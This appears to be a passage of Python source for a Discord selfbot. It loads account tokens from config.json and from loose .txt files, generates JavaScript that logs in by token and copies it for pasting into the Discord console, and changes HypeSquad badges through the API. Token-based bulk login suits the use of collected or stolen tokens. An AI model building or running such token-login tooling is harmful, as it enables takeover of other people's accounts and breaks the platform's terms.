                        # Listar fontes de tokens: config.json + arquivos .txt
                        sources = []
                        cfg = load_config()
                        cfg_tokens = cfg.get("tokens", [])
                        if cfg_tokens:
                            sources.append(("config.json", cfg_tokens))

                        txt_files = [f for f in os.listdir(BASE_DIR) if f.lower().endswith(".txt")]
                        for tf in sorted(txt_files):
                            try:
                                with open(os.path.join(BASE_DIR, tf), "r", encoding="utf-8") as fh:
                                    lines = [l.strip() for l in fh.readlines() if l.strip()]
                                if lines:
                                    sources.append((tf, [{"token": t, "username": None} for t in lines]))
                            except Exception:
                                pass

                        if not sources:
                            print(f"  {BRANCO}[{AZUL}!{BRANCO}]{NC} Nenhum arquivo com tokens encontrado.")
                            await wait_enter()
                            continue

                        print()
                        print(f"  {BRANCO}Selecione a fonte dos tokens:{NC}")
                        print()
                        for si, (sname, stokens) in enumerate(sources, 1):
                            print(f"  {BRANCO}[{ROXO}{si}{BRANCO}]{NC}  {sname}  ({len(stokens)} token(s))")
                        print()
                        src_choice = await prompt_input(f"  {BRANCO}[{AZUL}>{BRANCO}]{NC} Escolha: ")
                        src_choice = src_choice.strip()
                        if not src_choice.isdigit() or int(src_choice) < 1 or int(src_choice) > len(sources):
                            print(f"  {BRANCO}[{AZUL}!{BRANCO}]{NC} Opcao invalida.")
                            await asyncio.sleep(1)
                            continue

                        src_name, entries = sources[int(src_choice) - 1]

                        print()
                        print(f"  {BRANCO}Tokens de {src_name}:{NC}")
                        for ci, ent in enumerate(entries, 1):
                            uname = ent.get("username") or ent["token"][:20] + "..."
                            print(f"  {BRANCO}[{ROXO}{ci}{BRANCO}]{NC}  {uname}")
                        print()

                        if len(entries) > 1:
                            print(f"  {BRANCO}Modo:{NC}")
                            print(f"  {BRANCO}[{ROXO}1{BRANCO}]{NC}  Todas de uma vez (1 comando)")
                            print(f"  {BRANCO}[{ROXO}2{BRANCO}]{NC}  Uma por uma")
                            print()
                            lmode = await prompt_input(f"  {BRANCO}[{AZUL}>{BRANCO}]{NC} Escolha: ")
                            lmode = lmode.strip()
                        else:
                            lmode = "2"

                        if lmode == "1" and len(entries) > 1:
                            js_cmd = _generate_all_login_js(entries)
                            if not js_cmd:
                                print(f"  {BRANCO}[{AZUL}!{BRANCO}]{NC} Erro ao gerar comando.")
                                await wait_enter()
                                continue
                            _copy_to_clipboard(js_cmd)
                            print()
                            print(f"  \033[92m*\033[0m Comando copiado com {BRANCO}{len(entries)} conta(s){NC}!")
                            print()
                            print(f"  {BRANCO}Agora:{NC}")
                            print(f"  {AZUL}1.{NC} Abra o Discord Desktop")
                            print(f"  {AZUL}2.{NC} {BRANCO}Ctrl+Shift+I{NC} -> aba {BRANCO}Console{NC}")
                            print(f"  {AZUL}3.{NC} Cole {BRANCO}Ctrl+V{NC} e pressione {BRANCO}Enter{NC}")
                            print(f"  {AZUL}4.{NC} Discord recarrega com todas as contas!")
                            await wait_enter()
                        else:
                            print()
                            print(f"  {BRANCO}Abra o Discord Desktop com o Console aberto:{NC}")
                            print(f"  {AZUL}Ctrl+Shift+I{NC} -> aba {BRANCO}Console{NC}")
                            await wait_enter()

                            for li, ent in enumerate(entries):
                                uname = ent.get("username") or ent["token"][:20] + "..."
                                token = ent["token"]
                                js_cmd = _generate_single_login_js(token)
                                _copy_to_clipboard(js_cmd)

                                print()
                                print(f"  {BRANCO}{'-' * 55}{NC}")
                                print(f"  \033[92m*\033[0m [{li+1}/{len(entries)}] Copiado: {BRANCO}{uname}{NC}")
                                print()
                                if li == 0:
                                    print(f"  {AZUL}->{NC} Cole {BRANCO}Ctrl+V{NC} no Console e pressione {BRANCO}Enter{NC}")
                                else:
                                    print(f"  {AZUL}->{NC} No Discord: clique no avatar -> {BRANCO}Adicionar conta{NC}")
                                    print(f"  {AZUL}->{NC} Na tela de login: {BRANCO}Ctrl+Shift+I{NC} -> Console")
                                    print(f"  {AZUL}->{NC} Cole {BRANCO}Ctrl+V{NC} e pressione {BRANCO}Enter{NC}")

                                if li < len(entries) - 1:
                                    await wait_enter("\n  Logou Pressione ENTER para copiar a proxima...")
                                else:
                                    print()
                                    print(f"  \033[92m*\033[0m Todas as {len(entries)} contas processadas!")
                                    await wait_enter()
                    elif sub == "7":
                        async def _hypesquad_remove() -> tuple[bool, int]:
                            if not bot.session or bot.session.closed:
                                return False, 0
                            url = f"{API_BASE}/hypesquad/online"
                            while True:
                                async with bot.session.delete(url, headers=get_headers(bot.token)) as resp:
                                    if resp.status == 429:
                                        data = await resp.json()
                                        wait = data.get("retry_after", 5)
                                        print(f"  [rate-limit] Esperando {wait:.2f}s...")
                                        await asyncio.sleep(wait + 0.5)
                                        continue
                                    return resp.status in (200, 204), resp.status

                        async def _hypesquad_add(house_id: int) -> tuple[bool, int]:
                            if not bot.session or bot.session.closed:
                                return False, 0
                            url = f"{API_BASE}/hypesquad/online"
                            payload = {"house_id": house_id}
                            while True:
                                async with bot.session.post(url, headers=get_headers(bot.token), json=payload) as resp:
                                    if resp.status == 429:
                                        data = await resp.json()
                                        wait = data.get("retry_after", 5)
                                        print(f"  [rate-limit] Esperando {wait:.2f}s...")
                                        await asyncio.sleep(wait + 0.5)
                                        continue
                                    return resp.status in (200, 201, 204), resp.status

                        while True:
                            clear_screen()
                            show_banner()
                            print(f"  {BRANCO}{'-' * 58}{NC}")
                            print(f"  {BRANCO}insignia HypeSquad{NC}")
                            print(f"  {BRANCO}{'-' * 58}{NC}")
                            print()
                            print(f"  {BRANCO}[{ROXO}1{BRANCO}]{NC}  Remover insignia")
                            print(f"  {BRANCO}[{ROXO}2{BRANCO}]{NC}  Adicionar insignia")
                            print(f"  {BRANCO}[{ROXO}0{BRANCO}]{NC}  Voltar")
                            print(f"  {AZUL}  {'-' * 52}{NC}")
                            hs_action = await prompt_input(f"\n  {BRANCO}[{AZUL}>{BRANCO}]{NC} Escolha: ")
                            hs_action = hs_action.strip()

                            if hs_action == "0" or not hs_action:
                                break

                            if hs_action == "1":
                                print(f"\n  {BRANCO}[{AZUL}*{BRANCO}]{NC} Removendo insignia HypeSquad da conta ativa...")
                                try:
                                    ok, status = await _hypesquad_remove()
                                    if ok:
                                        print(f"  \033[92m*\033[0m Requisicao enviada com sucesso.")
                                        print(f"  {BRANCO}[{AZUL}i{BRANCO}]{NC} Atualize o perfil para refletir a mudanca.")
                                    else:
                                        print(f"  {BRANCO}[{AZUL}!{BRANCO}]{NC} Nao foi possivel remover agora (HTTP {status}).")
                                except Exception as e:
                                    print(f"  {BRANCO}[{AZUL}!{BRANCO}]{NC} Erro ao remover insignia: {e}")
                                await wait_enter()
                                continue

                            if hs_action == "2":
                                print()
                                print(f"  {BRANCO}Escolha a casa:{NC}")
                                print(f"  {BRANCO}[{ROXO}1{BRANCO}]{NC}  Bravery")
                                print(f"  {BRANCO}[{ROXO}2{BRANCO}]{NC}  Brilliance")
                                print(f"  {BRANCO}[{ROXO}3{BRANCO}]{NC}  Balance")
                                print(f"  {BRANCO}[{ROXO}0{BRANCO}]{NC}  Cancelar")
                                house_choice = await prompt_input(f"\n  {BRANCO}[{AZUL}>{BRANCO}]{NC} Casa: ")
                                house_choice = house_choice.strip()

                                if house_choice == "0" or not house_choice:
                                    continue
                                if house_choice not in ("1", "2", "3"):
                                    print(f"  {BRANCO}[{AZUL}!{BRANCO}]{NC} Casa invalida. Escolha 1, 2 ou 3.")
                                    await asyncio.sleep(1.2)
                                    continue

                                house_map = {"1": "Bravery", "2": "Brilliance", "3": "Balance"}
                                house_id = int(house_choice)
                                house_name = house_map[house_choice]
                                print(f"\n  {BRANCO}[{AZUL}*{BRANCO}]{NC} Adicionando insignia HypeSquad: {house_name}...")
                                try:
                                    ok, status = await _hypesquad_add(house_id)
                                    if ok:
                                        print(f"  \033[92m*\033[0m Insignia adicionada com sucesso ({house_name}).")
                                        print(f"  {BRANCO}[{AZUL}i{BRANCO}]{NC} Atualize o perfil para refletir a mudanca.")
                                    else:
                                        print(f"  {BRANCO}[{AZUL}!{BRANCO}]{NC} Nao foi possivel adicionar agora (HTTP {status}).")
                                except Exception as e:
                                    print(f"  {BRANCO}[{AZUL}!{BRANCO}]{NC} Erro ao adicionar insignia: {e}")
                                await wait_enter()
                                continue

                            print(f"  {BRANCO}[{AZUL}!{BRANCO}]{NC} Opcao invalida.")
                            await asyncio.sleep(1)
            else:
                print(f"  {BRANCO}[{AZUL}!{BRANCO}]{NC} Opcao invalida! Escolha de 0 a 10.")
                await asyncio.sleep(1.5)

    async def run_all():
        bots = []
        # Conecta apenas a conta ativa (ou a primeira se nenhuma ativa salva)
        saved_token = get_active_token()
        if saved_token and saved_token in valid_tokens:
            active_token = saved_token
        else:
            active_token = valid_tokens[0]
            set_active_token(active_token)

        active_bot = SelfBot(active_token, label="")
        bots.append(active_bot)

        # Mantem referencia das outras contas (nao conectadas) para gerenciamento
        all_tokens = valid_tokens

        tasks = [active_bot.start(), terminal_input_loop(bots, all_tokens)]
        try:
            await asyncio.gather(*tasks)
        except asyncio.CancelledError:
            for bot in bots:
                bot.running = False

    try:
        asyncio.run(run_all())
    except KeyboardInterrupt:
        print(f"\n  {BRANCO}[{AZUL}!{BRANCO}]{NC} Bot(s) encerrado(s).")


if __name__ == "__main__":
    os.system("title Suicide")
    main()




